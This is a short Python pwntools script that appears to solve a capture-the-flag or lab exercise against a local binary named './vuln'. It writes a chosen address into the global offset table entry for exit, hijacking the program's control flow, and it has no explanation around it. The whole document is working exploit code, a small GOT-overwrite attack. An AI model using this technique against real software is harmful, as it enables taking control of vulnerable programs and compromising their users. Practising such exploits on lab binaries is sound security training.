#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("Input address\n")

# 0804a01c R_386_JUMP_SLOT   exit@GLIBC_2.0
r.sendline(str(0x0804a01c))

r.recvuntil("Input value?\n")
r.sendline(str(0x80485c6))

print(r.recvall())
r.close()
